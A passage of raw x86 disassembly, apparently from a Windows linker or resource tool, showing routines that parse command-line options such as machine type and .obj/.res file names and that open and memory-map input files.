  401780:	b9 00 08 00 00       	mov    $0x800,%ecx
  401785:	e8 d8 fc ff ff       	call   0x401462
  40178a:	eb 10                	jmp    0x40179c
  40178c:	e8 7a ff ff ff       	call   0x40170b
  401791:	74 09                	je     0x40179c
  401793:	80 3f 2c             	cmpb   $0x2c,(%edi)
  401796:	75 06                	jne    0x40179e
  401798:	47                   	inc    %edi
  401799:	49                   	dec    %ecx
  40179a:	75 83                	jne    0x40171f
  40179c:	f9                   	stc
  40179d:	c3                   	ret
  40179e:	f8                   	clc
  40179f:	c3                   	ret
  4017a0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4017a2:	89 07                	mov    %eax,(%edi)
  4017a4:	c6 47 04 00          	movb   $0x0,0x4(%edi)
  4017a8:	c3                   	ret
  4017a9:	83 c7 08             	add    $0x8,%edi
  4017ac:	83 e9 08             	sub    $0x8,%ecx
  4017af:	e8 57 ff ff ff       	call   0x40170b
  4017b4:	74 55                	je     0x40180b
  4017b6:	8a 07                	mov    (%edi),%al
  4017b8:	3c 3a                	cmp    $0x3a,%al
  4017ba:	74 04                	je     0x4017c0
  4017bc:	3c 3d                	cmp    $0x3d,%al
  4017be:	75 06                	jne    0x4017c6
  4017c0:	47                   	inc    %edi
  4017c1:	49                   	dec    %ecx
  4017c2:	74 47                	je     0x40180b
  4017c4:	8a 07                	mov    (%edi),%al
  4017c6:	24 df                	and    $0xdf,%al
  4017c8:	3c 41                	cmp    $0x41,%al
  4017ca:	75 19                	jne    0x4017e5
  4017cc:	83 e9 05             	sub    $0x5,%ecx
  4017cf:	72 3a                	jb     0x40180b
  4017d1:	8b 47 01             	mov    0x1(%edi),%eax
  4017d4:	83 c7 05             	add    $0x5,%edi
  4017d7:	25 df df ff ff       	and    $0xffffdfdf,%eax
  4017dc:	3d 4d 44 36 34       	cmp    $0x3436444d,%eax
  4017e1:	75 28                	jne    0x40180b
  4017e3:	eb 1c                	jmp    0x401801
  4017e5:	3c 58                	cmp    $0x58,%al
  4017e7:	75 22                	jne    0x40180b
  4017e9:	83 e9 03             	sub    $0x3,%ecx
  4017ec:	72 1d                	jb     0x40180b
  4017ee:	66 8b 47 01          	mov    0x1(%edi),%ax
  4017f2:	83 c7 03             	add    $0x3,%edi
  4017f5:	66 3d 38 36          	cmp    $0x3638,%ax
  4017f9:	74 0d                	je     0x401808
  4017fb:	66 3d 36 34          	cmp    $0x3436,%ax
  4017ff:	75 0a                	jne    0x40180b
  401801:	80 0d 7f 90 40 00 01 	orb    $0x1,0x40907f
  401808:	30 e4                	xor    %ah,%ah
  40180a:	c3                   	ret
  40180b:	ba 0e 95 40 00       	mov    $0x40950e,%edx
  401810:	e8 2a f9 ff ff       	call   0x40113f
  401815:	f9                   	stc
  401816:	c3                   	ret
  401817:	f8                   	clc
  401818:	c3                   	ret
  401819:	80 fc 4e             	cmp    $0x4e,%ah
  40181c:	75 2e                	jne    0x40184c
  40181e:	47                   	inc    %edi
  40181f:	49                   	dec    %ecx
  401820:	74 28                	je     0x40184a
  401822:	47                   	inc    %edi
  401823:	49                   	dec    %ecx
  401824:	74 24                	je     0x40184a
  401826:	8a 07                	mov    (%edi),%al
  401828:	24 df                	and    $0xdf,%al
  40182a:	b4 01                	mov    $0x1,%ah
  40182c:	3c 4f                	cmp    $0x4f,%al
  40182e:	74 12                	je     0x401842
  401830:	fe c4                	inc    %ah
  401832:	3c 49                	cmp    $0x49,%al
  401834:	74 0c                	je     0x401842
  401836:	d0 e4                	shl    $1,%ah
  401838:	3c 45                	cmp    $0x45,%al
  40183a:	74 06                	je     0x401842
  40183c:	d0 e4                	shl    $1,%ah
  40183e:	3c 57                	cmp    $0x57,%al
  401840:	75 08                	jne    0x40184a
  401842:	08 25 7d 90 40 00    	or     %ah,0x40907d
  401848:	eb 3c                	jmp    0x401886
  40184a:	f9                   	stc
  40184b:	c3                   	ret
  40184c:	80 fc 45             	cmp    $0x45,%ah
  40184f:	75 09                	jne    0x40185a
  401851:	80 0d 7e 90 40 00 04 	orb    $0x4,0x40907e
  401858:	eb 28                	jmp    0x401882
  40185a:	80 fc 42             	cmp    $0x42,%ah
  40185d:	75 09                	jne    0x401868
  40185f:	80 0d 7d 90 40 00 10 	orb    $0x10,0x40907d
  401866:	eb 1a                	jmp    0x401882
  401868:	80 fc 4f             	cmp    $0x4f,%ah
  40186b:	75 09                	jne    0x401876
  40186d:	80 0d 7e 90 40 00 02 	orb    $0x2,0x40907e
  401874:	eb 0c                	jmp    0x401882
  401876:	80 fc 52             	cmp    $0x52,%ah
  401879:	75 12                	jne    0x40188d
  40187b:	80 0d 7e 90 40 00 01 	orb    $0x1,0x40907e
  401882:	47                   	inc    %edi
  401883:	49                   	dec    %ecx
  401884:	74 7f                	je     0x401905
  401886:	47                   	inc    %edi
  401887:	49                   	dec    %ecx
  401888:	74 7b                	je     0x401905
  40188a:	30 e4                	xor    %ah,%ah
  40188c:	c3                   	ret
  40188d:	80 fc 46             	cmp    $0x46,%ah
  401890:	74 2f                	je     0x4018c1
  401892:	80 fc 4d             	cmp    $0x4d,%ah
  401895:	75 28                	jne    0x4018bf
  401897:	83 f9 08             	cmp    $0x8,%ecx
  40189a:	72 23                	jb     0x4018bf
  40189c:	8b 47 02             	mov    0x2(%edi),%eax
  40189f:	25 df df df df       	and    $0xdfdfdfdf,%eax
  4018a4:	3d 41 43 48 49       	cmp    $0x49484341,%eax
  4018a9:	75 14                	jne    0x4018bf
  4018ab:	66 8b 47 06          	mov    0x6(%edi),%ax
  4018af:	66 25 df df          	and    $0xdfdf,%ax
  4018b3:	66 3d 4e 45          	cmp    $0x454e,%ax
  4018b7:	75 06                	jne    0x4018bf
  4018b9:	e8 eb fe ff ff       	call   0x4017a9
  4018be:	c3                   	ret
  4018bf:	f8                   	clc
  4018c0:	c3                   	ret
  4018c1:	47                   	inc    %edi
  4018c2:	49                   	dec    %ecx
  4018c3:	74 40                	je     0x401905
  4018c5:	47                   	inc    %edi
  4018c6:	49                   	dec    %ecx
  4018c7:	74 3c                	je     0x401905
  4018c9:	80 3f 6f             	cmpb   $0x6f,(%edi)
  4018cc:	74 05                	je     0x4018d3
  4018ce:	80 3f 4f             	cmpb   $0x4f,(%edi)
  4018d1:	75 b7                	jne    0x40188a
  4018d3:	47                   	inc    %edi
  4018d4:	49                   	dec    %ecx
  4018d5:	74 2e                	je     0x401905
  4018d7:	e8 2f fe ff ff       	call   0x40170b
  4018dc:	74 27                	je     0x401905
  4018de:	89 fe                	mov    %edi,%esi
  4018e0:	8a 27                	mov    (%edi),%ah
  4018e2:	46                   	inc    %esi
  4018e3:	80 fc 22             	cmp    $0x22,%ah
  4018e6:	74 19                	je     0x401901
  4018e8:	80 fc 27             	cmp    $0x27,%ah
  4018eb:	74 14                	je     0x401901
  4018ed:	4e                   	dec    %esi
  4018ee:	b4 20                	mov    $0x20,%ah
  4018f0:	eb 0f                	jmp    0x401901
  4018f2:	8a 07                	mov    (%edi),%al
  4018f4:	38 e0                	cmp    %ah,%al
  4018f6:	74 0f                	je     0x401907
  4018f8:	80 fc 20             	cmp    $0x20,%ah
  4018fb:	75 04                	jne    0x401901
  4018fd:	3c 2c                	cmp    $0x2c,%al
  4018ff:	74 0d                	je     0x40190e
  401901:	47                   	inc    %edi
  401902:	49                   	dec    %ecx
  401903:	75 ed                	jne    0x4018f2
  401905:	f9                   	stc
  401906:	c3                   	ret
  401907:	80 fc 20             	cmp    $0x20,%ah
  40190a:	74 02                	je     0x40190e
  40190c:	47                   	inc    %edi
  40190d:	49                   	dec    %ecx
  40190e:	89 fa                	mov    %edi,%edx
  401910:	80 3a 2e             	cmpb   $0x2e,(%edx)
  401913:	74 0d                	je     0x401922
  401915:	4a                   	dec    %edx
  401916:	39 f2                	cmp    %esi,%edx
  401918:	75 f6                	jne    0x401910
  40191a:	89 fa                	mov    %edi,%edx
  40191c:	b3 30                	mov    $0x30,%bl
  40191e:	31 c0                	xor    %eax,%eax
  401920:	eb 3c                	jmp    0x40195e
  401922:	8b 02                	mov    (%edx),%eax
  401924:	b3 20                	mov    $0x20,%bl
  401926:	3d 2e 6f 62 6a       	cmp    $0x6a626f2e,%eax
  40192b:	74 31                	je     0x40195e
  40192d:	3d 2e 4f 62 6a       	cmp    $0x6a624f2e,%eax
  401932:	74 2a                	je     0x40195e
  401934:	3d 2e 4f 42 4a       	cmp    $0x4a424f2e,%eax
  401939:	74 23                	je     0x40195e
  40193b:	b3 10                	mov    $0x10,%bl
  40193d:	3d 2e 72 65 73       	cmp    $0x7365722e,%eax
  401942:	74 1a                	je     0x40195e
  401944:	3d 2e 52 65 73       	cmp    $0x7365522e,%eax
  401949:	74 13                	je     0x40195e
  40194b:	3d 2e 52 45 53       	cmp    $0x5345522e,%eax
  401950:	74 0c                	je     0x40195e
  401952:	ba e2 94 40 00       	mov    $0x4094e2,%edx
  401957:	e8 e3 f7 ff ff       	call   0x40113f
  40195c:	f9                   	stc
  40195d:	c3                   	ret
  40195e:	08 1d 7e 90 40 00    	or     %bl,0x40907e
  401964:	51                   	push   %ecx
  401965:	57                   	push   %edi
  401966:	89 d1                	mov    %edx,%ecx
  401968:	29 f1                	sub    %esi,%ecx
  40196a:	76 22                	jbe    0x40198e
  40196c:	f6 c3 10             	test   $0x10,%bl
  40196f:	74 0e                	je     0x40197f
  401971:	51                   	push   %ecx
  401972:	56                   	push   %esi
  401973:	bf c0 db 40 00       	mov    $0x40dbc0,%edi
  401978:	e8 23 fe ff ff       	call   0x4017a0
  40197d:	5e                   	pop    %esi
  40197e:	59                   	pop    %ecx
  40197f:	f6 c3 20             	test   $0x20,%bl
  401982:	74 0a                	je     0x40198e
  401984:	bf c0 dd 40 00       	mov    $0x40ddc0,%edi
  401989:	e8 12 fe ff ff       	call   0x4017a0
  40198e:	5f                   	pop    %edi
  40198f:	59                   	pop    %ecx
  401990:	80 3f 2c             	cmpb   $0x2c,(%edi)
  401993:	0f 84 3a ff ff ff    	je     0x4018d3
  401999:	31 c0                	xor    %eax,%eax
  40199b:	c3                   	ret
  40199c:	f9                   	stc
  40199d:	c3                   	ret
  40199e:	50                   	push   %eax
  40199f:	51                   	push   %ecx
  4019a0:	57                   	push   %edi
  4019a1:	52                   	push   %edx
  4019a2:	bf fc a8 40 00       	mov    $0x40a8fc,%edi
  4019a7:	e8 54 f6 ff ff       	call   0x401000
  4019ac:	b0 68                	mov    $0x68,%al
  4019ae:	aa                   	stos   %al,%es:(%edi)
  4019af:	6a 00                	push   $0x0
  4019b1:	68 00 90 40 00       	push   $0x409000
  4019b6:	6a 09                	push   $0x9
  4019b8:	68 fc a8 40 00       	push   $0x40a8fc
  4019bd:	ff 35 64 90 40 00    	push   0x409064
  4019c3:	e8 38 06 01 00       	call   0x412000
  4019c8:	5a                   	pop    %edx
  4019c9:	5f                   	pop    %edi
  4019ca:	59                   	pop    %ecx
  4019cb:	58                   	pop    %eax
  4019cc:	c3                   	ret
  4019cd:	c6 05 7c 90 40 00 00 	movb   $0x0,0x40907c
  4019d4:	80 0d c9 ab 40 00 08 	orb    $0x8,0x40abc9
  4019db:	e8 4a 06 01 00       	call   0x41202a
  4019e0:	89 c6                	mov    %eax,%esi
  4019e2:	50                   	push   %eax
  4019e3:	e8 48 06 01 00       	call   0x412030
  4019e8:	89 c1                	mov    %eax,%ecx
  4019ea:	d1 e1                	shl    $1,%ecx
  4019ec:	8b 3d 60 aa 40 00    	mov    0x40aa60,%edi
  4019f2:	8b 1d 6c aa 40 00    	mov    0x40aa6c,%ebx
  4019f8:	e8 b2 65 00 00       	call   0x407faf
  4019fd:	89 1d 6c aa 40 00    	mov    %ebx,0x40aa6c
  401a03:	89 3d 64 aa 40 00    	mov    %edi,0x40aa64
  401a09:	89 3d 68 aa 40 00    	mov    %edi,0x40aa68
  401a0f:	8b 35 60 aa 40 00    	mov    0x40aa60,%esi
  401a15:	89 f9                	mov    %edi,%ecx
  401a17:	29 f1                	sub    %esi,%ecx
  401a19:	51                   	push   %ecx
  401a1a:	56                   	push   %esi
  401a1b:	89 f7                	mov    %esi,%edi
  401a1d:	e3 5d                	jecxz  0x401a7c
  401a1f:	8a 07                	mov    (%edi),%al
  401a21:	3c 22                	cmp    $0x22,%al
  401a23:	74 04                	je     0x401a29
  401a25:	3c 27                	cmp    $0x27,%al
  401a27:	75 06                	jne    0x401a2f
  401a29:	47                   	inc    %edi
  401a2a:	49                   	dec    %ecx
  401a2b:	74 4f                	je     0x401a7c
  401a2d:	eb 02                	jmp    0x401a31
  401a2f:	b0 20                	mov    $0x20,%al
  401a31:	f2 ae                	repnz scas %es:(%edi),%al
  401a33:	75 47                	jne    0x401a7c
  401a35:	e8 d1 fc ff ff       	call   0x40170b
  401a3a:	74 40                	je     0x401a7c
  401a3c:	66 8b 07             	mov    (%edi),%ax
  401a3f:	3c 2d                	cmp    $0x2d,%al
  401a41:	74 04                	je     0x401a47
  401a43:	3c 2f                	cmp    $0x2f,%al
  401a45:	75 42                	jne    0x401a89
  401a47:	80 fc 3f             	cmp    $0x3f,%ah
  401a4a:	74 11                	je     0x401a5d
  401a4c:	80 e4 df             	and    $0xdf,%ah
  401a4f:	e8 c5 fd ff ff       	call   0x401819
  401a54:	72 26                	jb     0x401a7c
  401a56:	74 dd                	je     0x401a35
  401a58:	80 fc 48             	cmp    $0x48,%ah
  401a5b:	75 09                	jne    0x401a66
  401a5d:	80 0d 7e 90 40 00 08 	orb    $0x8,0x40907e
  401a64:	eb 16                	jmp    0x401a7c
  401a66:	80 fc 44             	cmp    $0x44,%ah
  401a69:	74 0a                	je     0x401a75
  401a6b:	47                   	inc    %edi
  401a6c:	49                   	dec    %ecx
  401a6d:	74 0d                	je     0x401a7c
  401a6f:	47                   	inc    %edi
  401a70:	49                   	dec    %ecx
  401a71:	74 09                	je     0x401a7c
  401a73:	eb c0                	jmp    0x401a35
  401a75:	e8 9d fc ff ff       	call   0x401717
  401a7a:	73 b9                	jae    0x401a35
  401a7c:	5e                   	pop    %esi
  401a7d:	59                   	pop    %ecx
  401a7e:	83 3d 78 90 40 00 00 	cmpl   $0x0,0x409078
  401a85:	75 4e                	jne    0x401ad5
  401a87:	eb 42                	jmp    0x401acb
  401a89:	8a 1d 7e 90 40 00    	mov    0x40907e,%bl
  401a8f:	80 e3 30             	and    $0x30,%bl
  401a92:	c0 eb 04             	shr    $0x4,%bl
  401a95:	08 1d 7e 90 40 00    	or     %bl,0x40907e
  401a9b:	5e                   	pop    %esi
  401a9c:	59                   	pop    %ecx
  401a9d:	80 7c 0e ff 20       	cmpb   $0x20,-0x1(%esi,%ecx,1)
  401aa2:	75 04                	jne    0x401aa8
  401aa4:	e2 f7                	loop   0x401a9d
  401aa6:	eb 23                	jmp    0x401acb
  401aa8:	89 ca                	mov    %ecx,%edx
  401aaa:	8a 64 0e ff          	mov    -0x1(%esi,%ecx,1),%ah
  401aae:	b0 22                	mov    $0x22,%al
  401ab0:	38 e0                	cmp    %ah,%al
  401ab2:	74 06                	je     0x401aba
  401ab4:	b0 27                	mov    $0x27,%al
  401ab6:	38 e0                	cmp    %ah,%al
  401ab8:	75 07                	jne    0x401ac1
  401aba:	a2 7c 90 40 00       	mov    %al,0x40907c
  401abf:	eb 08                	jmp    0x401ac9
  401ac1:	b0 20                	mov    $0x20,%al
  401ac3:	38 44 0e ff          	cmp    %al,-0x1(%esi,%ecx,1)
  401ac7:	74 15                	je     0x401ade
  401ac9:	e2 f8                	loop   0x401ac3
  401acb:	ba 80 90 40 00       	mov    $0x409080,%edx
  401ad0:	e8 6a f6 ff ff       	call   0x40113f
  401ad5:	80 25 c9 ab 40 00 f7 	andb   $0xf7,0x40abc9
  401adc:	f9                   	stc
  401add:	c3                   	ret
  401ade:	01 ce                	add    %ecx,%esi
  401ae0:	29 d1                	sub    %edx,%ecx
  401ae2:	73 e7                	jae    0x401acb
  401ae4:	f7 d9                	neg    %ecx
  401ae6:	51                   	push   %ecx
  401ae7:	80 3d 7c 90 40 00 00 	cmpb   $0x0,0x40907c
  401aee:	74 01                	je     0x401af1
  401af0:	49                   	dec    %ecx
  401af1:	bf c0 d9 40 00       	mov    $0x40d9c0,%edi
  401af6:	30 e4                	xor    %ah,%ah
  401af8:	8a 06                	mov    (%esi),%al
  401afa:	3c 7f                	cmp    $0x7f,%al
  401afc:	76 02                	jbe    0x401b00
  401afe:	b4 10                	mov    $0x10,%ah
  401b00:	88 07                	mov    %al,(%edi)
  401b02:	46                   	inc    %esi
  401b03:	47                   	inc    %edi
  401b04:	49                   	dec    %ecx
  401b05:	75 f1                	jne    0x401af8
  401b07:	c6 07 00             	movb   $0x0,(%edi)
  401b0a:	08 25 c4 ab 40 00    	or     %ah,0x40abc4
  401b10:	59                   	pop    %ecx
  401b11:	89 ca                	mov    %ecx,%edx
  401b13:	8a 81 bf d9 40 00    	mov    0x40d9bf(%ecx),%al
  401b19:	3c 2e                	cmp    $0x2e,%al
  401b1b:	74 14                	je     0x401b31
  401b1d:	3c 5c                	cmp    $0x5c,%al
  401b1f:	74 06                	je     0x401b27
  401b21:	3c 3a                	cmp    $0x3a,%al
  401b23:	74 02                	je     0x401b27
  401b25:	e2 ec                	loop   0x401b13
  401b27:	b3 c0                	mov    $0xc0,%bl
  401b29:	81 c2 c0 d9 40 00    	add    $0x40d9c0,%edx
  401b2f:	eb 71                	jmp    0x401ba2
  401b31:	89 ca                	mov    %ecx,%edx
  401b33:	81 c2 c0 d9 40 00    	add    $0x40d9c0,%edx
  401b39:	8b 02                	mov    (%edx),%eax
  401b3b:	4a                   	dec    %edx
  401b3c:	b3 40                	mov    $0x40,%bl
  401b3e:	66 3d 52 43          	cmp    $0x4352,%ax
  401b42:	74 0c                	je     0x401b50
  401b44:	66 3d 52 63          	cmp    $0x6352,%ax
  401b48:	74 06                	je     0x401b50
  401b4a:	66 3d 72 63          	cmp    $0x6372,%ax
  401b4e:	75 08                	jne    0x401b58
  401b50:	80 7a 03 00          	cmpb   $0x0,0x3(%edx)
  401b54:	74 4c                	je     0x401ba2
  401b56:	eb 43                	jmp    0x401b9b
  401b58:	b3 80                	mov    $0x80,%bl
  401b5a:	c1 e0 08             	shl    $0x8,%eax
  401b5d:	c1 e8 08             	shr    $0x8,%eax
  401b60:	3d 52 45 53 00       	cmp    $0x534552,%eax
  401b65:	74 0e                	je     0x401b75
  401b67:	3d 52 65 73 00       	cmp    $0x736552,%eax
  401b6c:	74 07                	je     0x401b75
  401b6e:	3d 72 65 73 00       	cmp    $0x736572,%eax
  401b73:	75 26                	jne    0x401b9b
  401b75:	80 7a 04 00          	cmpb   $0x0,0x4(%edx)
  401b79:	75 20                	jne    0x401b9b
  401b7b:	80 0d 7e 90 40 00 02 	orb    $0x2,0x40907e
  401b82:	f6 05 7e 90 40 00 01 	testb  $0x1,0x40907e
  401b89:	74 17                	je     0x401ba2
  401b8b:	f6 05 7e 90 40 00 02 	testb  $0x2,0x40907e
  401b92:	75 0e                	jne    0x401ba2
  401b94:	ba 76 95 40 00       	mov    $0x409576,%edx
  401b99:	eb 2c                	jmp    0x401bc7
  401b9b:	ba 57 93 40 00       	mov    $0x409357,%edx
  401ba0:	eb 25                	jmp    0x401bc7
  401ba2:	08 1d 7e 90 40 00    	or     %bl,0x40907e
  401ba8:	f6 05 7e 90 40 00 03 	testb  $0x3,0x40907e
  401baf:	75 07                	jne    0x401bb8
  401bb1:	80 0d 7e 90 40 00 03 	orb    $0x3,0x40907e
  401bb8:	89 15 e0 a9 40 00    	mov    %edx,0x40a9e0
  401bbe:	80 25 c9 ab 40 00 f7 	andb   $0xf7,0x40abc9
  401bc5:	f8                   	clc
  401bc6:	c3                   	ret
  401bc7:	e8 73 f5 ff ff       	call   0x40113f
  401bcc:	80 25 c9 ab 40 00 f7 	andb   $0xf7,0x40abc9
  401bd3:	f9                   	stc
  401bd4:	c3                   	ret
  401bd5:	53                   	push   %ebx
  401bd6:	57                   	push   %edi
  401bd7:	56                   	push   %esi
  401bd8:	89 d6                	mov    %edx,%esi
  401bda:	56                   	push   %esi
  401bdb:	bb 00 02 00 00       	mov    $0x200,%ebx
  401be0:	bf c0 df 40 00       	mov    $0x40dfc0,%edi
  401be5:	b9 00 04 00 00       	mov    $0x400,%ecx
  401bea:	e8 5e 34 00 00       	call   0x40504d
  401bef:	83 e9 02             	sub    $0x2,%ecx
  401bf2:	76 0b                	jbe    0x401bff
  401bf4:	66 ab                	stos   %ax,%es:(%edi)
  401bf6:	66 09 c0             	or     %ax,%ax
  401bf9:	74 04                	je     0x401bff
  401bfb:	09 db                	or     %ebx,%ebx
  401bfd:	75 eb                	jne    0x401bea
  401bff:	be c0 df 40 00       	mov    $0x40dfc0,%esi
  401c04:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  401c0b:	75 22                	jne    0x401c2f
  401c0d:	89 fb                	mov    %edi,%ebx
  401c0f:	29 f3                	sub    %esi,%ebx
  401c11:	57                   	push   %edi
  401c12:	6a 00                	push   $0x0
  401c14:	6a 00                	push   $0x0
  401c16:	68 00 04 00 00       	push   $0x400
  401c1b:	57                   	push   %edi
  401c1c:	53                   	push   %ebx
  401c1d:	56                   	push   %esi
  401c1e:	6a 00                	push   $0x0
  401c20:	6a 00                	push   $0x0
  401c22:	e8 0f 04 01 00       	call   0x412036
  401c27:	09 c0                	or     %eax,%eax
  401c29:	5a                   	pop    %edx
  401c2a:	74 07                	je     0x401c33
  401c2c:	58                   	pop    %eax
  401c2d:	eb 05                	jmp    0x401c34
  401c2f:	89 f2                	mov    %esi,%edx
  401c31:	eb f9                	jmp    0x401c2c
  401c33:	5a                   	pop    %edx
  401c34:	5e                   	pop    %esi
  401c35:	5f                   	pop    %edi
  401c36:	5b                   	pop    %ebx
  401c37:	c3                   	ret
  401c38:	ba c0 d9 40 00       	mov    $0x40d9c0,%edx
  401c3d:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  401c44:	75 09                	jne    0x401c4f
  401c46:	f6 05 c4 ab 40 00 10 	testb  $0x10,0x40abc4
  401c4d:	74 05                	je     0x401c54
  401c4f:	e8 81 ff ff ff       	call   0x401bd5
  401c54:	6a 00                	push   $0x0
  401c56:	68 80 00 00 00       	push   $0x80
  401c5b:	6a 03                	push   $0x3
  401c5d:	6a 00                	push   $0x0
  401c5f:	6a 01                	push   $0x1
  401c61:	68 00 00 00 c0       	push   $0xc0000000
  401c66:	52                   	push   %edx
  401c67:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  401c6e:	74 08                	je     0x401c78
  401c70:	ff 15 50 90 40 00    	call   *0x409050
  401c76:	eb 05                	jmp    0x401c7d
  401c78:	e8 95 03 01 00       	call   0x412012
  401c7d:	83 f8 ff             	cmp    $0xffffffff,%eax
  401c80:	74 05                	je     0x401c87
  401c82:	a3 48 90 40 00       	mov    %eax,0x409048
  401c87:	c3                   	ret
  401c88:	6a 00                	push   $0x0
  401c8a:	6a 00                	push   $0x0
  401c8c:	6a 00                	push   $0x0
  401c8e:	6a 02                	push   $0x2
  401c90:	6a 00                	push   $0x0
  401c92:	ff 35 48 90 40 00    	push   0x409048
  401c98:	f6 05 c4 ab 40 00 80 	testb  $0x80,0x40abc4
  401c9f:	74 08                	je     0x401ca9
  401ca1:	ff 15 54 90 40 00    	call   *0x409054
  401ca7:	eb 05                	jmp    0x401cae
  401ca9:	e8 8e 03 01 00       	call   0x41203c
  401cae:	09 c0                	or     %eax,%eax
  401cb0:	74 3a                	je     0x401cec
  401cb2:	a3 44 90 40 00       	mov    %eax,0x409044
  401cb7:	6a 00                	push   $0x0
  401cb9:	6a 00                	push   $0x0
  401cbb:	6a 00                	push   $0x0
  401cbd:	6a 04                	push   $0x4
  401cbf:	50                   	push   %eax
  401cc0:	e8 7d 03 01 00       	call   0x412042
  401cc5:	09 c0                	or     %eax,%eax
  401cc7:	74 23                	je     0x401cec
  401cc9:	a3 90 aa 40 00       	mov    %eax,0x40aa90
  401cce:	6a 00                	push   $0x0
  401cd0:	ff 35 48 90 40 00    	push   0x409048
  401cd6:	e8 6d 03 01 00       	call   0x412048
  401cdb:	83 f8 ff             	cmp    $0xffffffff,%eax
  401cde:	74 0c                	je     0x401cec
  401ce0:	03 05 90 aa 40 00    	add    0x40aa90,%eax
  401ce6:	a3 94 aa 40 00       	mov    %eax,0x40aa94
  401ceb:	c3                   	ret
  401cec:	be 54 95 40 00       	mov    $0x409554,%esi
  401cf1:	e8 cb f4 ff ff       	call   0x4011c1
  401cf6:	f9                   	stc
  401cf7:	c3                   	ret
  401cf8:	6a 00                	push   $0x0
  401cfa:	ff 35 48 90 40 00    	push   0x409048
  401d00:	e8 43 03 01 00       	call   0x412048
  401d05:	83 f8 ff             	cmp    $0xffffffff,%eax
  401d08:	74 44                	je     0x401d4e
  401d0a:	89 c7                	mov    %eax,%edi
  401d0c:	6a 04                	push   $0x4
  401d0e:	68 00 10 00 00       	push   $0x1000
  401d13:	57                   	push   %edi
  401d14:	6a 00                	push   $0x0
  401d16:	e8 33 03 01 00       	call   0x41204e
  401d1b:	ba 3f a4 40 00       	mov    $0x40a43f,%edx
  401d20:	09 c0                	or     %eax,%eax
  401d22:	74 36                	je     0x401d5a
  401d24:	a3 70 aa 40 00       	mov    %eax,0x40aa70
  401d29:	01 f8                	add    %edi,%eax
  401d2b:	a3 78 aa 40 00       	mov    %eax,0x40aa78
  401d30:	6a 00                	push   $0x0
  401d32:	68 00 90 40 00       	push   $0x409000
  401d37:	57                   	push   %edi
  401d38:	ff 35 70 aa 40 00    	push   0x40aa70
  401d3e:	ff 35 48 90 40 00    	push   0x409048
  401d44:	e8 0b 03 01 00       	call   0x412054
  401d49:	09 c0                	or     %eax,%eax
  401d4b:	74 01                	je     0x401d4e
  401d4d:	c3                   	ret
  401d4e:	be 54 95 40 00       	mov    $0x409554,%esi
  401d53:	e8 69 f4 ff ff       	call   0x4011c1
  401d58:	eb 05                	jmp    0x401d5f
  401d5a:	e8 e0 f3 ff ff       	call   0x40113f
  401d5f:	f9                   	stc
  401d60:	c3                   	ret
  401d61:	80 7e 24 04          	cmpb   $0x4,0x24(%esi)
  401d65:	75 10                	jne    0x401d77
  401d67:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  401d6a:	e8 d2 20 00 00       	call   0x403e41
  401d6f:	c7 46 1c 00 00 00 00 	movl   $0x0,0x1c(%esi)
  401d76:	c3                   	ret
  401d77:	ff 76 18             	push   0x18(%esi)
  401d7a:	e8 db 02 01 00       	call   0x41205a
  401d7f:	ff 76 1c             	push   0x1c(%esi)
  401d82:	e8 9d 02 01 00       	call   0x412024
  401d87:	ff 76 14             	push   0x14(%esi)
  401d8a:	e8 95 02 01 00       	call   0x412024
  401d8f:	c3                   	ret
  401d90:	b9 00 04 00 00       	mov    $0x400,%ecx
  401d95:	e8 c8 f6 ff ff       	call   0x401462
  401d9a:	b9 00 08 00 00       	mov    $0x800,%ecx
  401d9f:	e8 be f6 ff ff       	call   0x401462
  401da4:	8b 35 64 aa 40 00    	mov    0x40aa64,%esi
  401daa:	3b 35 68 aa 40 00    	cmp    0x40aa68,%esi
  401db0:	73 18                	jae    0x401dca
  401db2:	83 3e 04             	cmpl   $0x4,(%esi)
  401db5:	77 0e                	ja     0x401dc5
  401db7:	83 7e 14 00          	cmpl   $0x0,0x14(%esi)
  401dbb:	74 05                	je     0x401dc2
  401dbd:	e8 9f ff ff ff       	call   0x401d61
  401dc2:	83 c6 20             	add    $0x20,%esi
  401dc5:	83 c6 20             	add    $0x20,%esi
  401dc8:	eb e0                	jmp    0x401daa
  401dca:	83 3d 78 90 40 00 00 	cmpl   $0x0,0x409078
  401dd1:	75 23                	jne    0x401df6
  401dd3:	a1 70 aa 40 00       	mov    0x40aa70,%eax
  401dd8:	83 c0 20             	add    $0x20,%eax
  401ddb:	3b 05 78 aa 40 00    	cmp    0x40aa78,%eax
  401de1:	75 13                	jne    0x401df6
  401de3:	f6 05 7e 90 40 00 04 	testb  $0x4,0x40907e
  401dea:	75 0a                	jne    0x401df6
  401dec:	ba 25 94 40 00       	mov    $0x409425,%edx
  401df1:	e8 49 f3 ff ff       	call   0x40113f
  401df6:	c3                   	ret
  401df7:	f7 c3 03 00 00 00    	test   $0x3,%ebx
  401dfd:	74 09                	je     0x401e08
  401dff:	c1 eb 02             	shr    $0x2,%ebx
  401e02:	c1 e3 02             	shl    $0x2,%ebx
  401e05:	83 c3 04             	add    $0x4,%ebx
  401e08:	c3                   	ret
  401e09:	8b 47 04             	mov    0x4(%edi),%eax
  401e0c:	01 f8                	add    %edi,%eax
  401e0e:	66 8b 40 f6          	mov    -0xa(%eax),%ax
  401e12:	25 ff ff 00 00       	and    $0xffff,%eax
  401e17:	c3                   	ret
  401e18:	8b 3d 24 90 40 00    	mov    0x409024,%edi
  401e1e:	a1 0c 90 40 00       	mov    0x40900c,%eax
  401e23:	29 f8                	sub    %edi,%eax
  401e25:	83 e8 10             	sub    $0x10,%eax
  401e28:	c1 e8 03             	shr    $0x3,%eax
  401e2b:	66 2b 47 0c          	sub    0xc(%edi),%ax
  401e2f:	31 d2                	xor    %edx,%edx
  401e31:	c3                   	ret
  401e32:	31 ed                	xor    %ebp,%ebp
  401e34:	8b 1d 70 aa 40 00    	mov    0x40aa70,%ebx
  401e3a:	83 c3 20             	add    $0x20,%ebx
  401e3d:	c3                   	ret
  401e3e:	3b 1d 78 aa 40 00    	cmp    0x40aa78,%ebx
  401e44:	73 28                	jae    0x401e6e
  401e46:	89 df                	mov    %ebx,%edi
  401e48:	8b 43 04             	mov    0x4(%ebx),%eax
  401e4b:	03 1b                	add    (%ebx),%ebx
  401e4d:	01 c3                	add    %eax,%ebx
  401e4f:	e8 a3 ff ff ff       	call   0x401df7
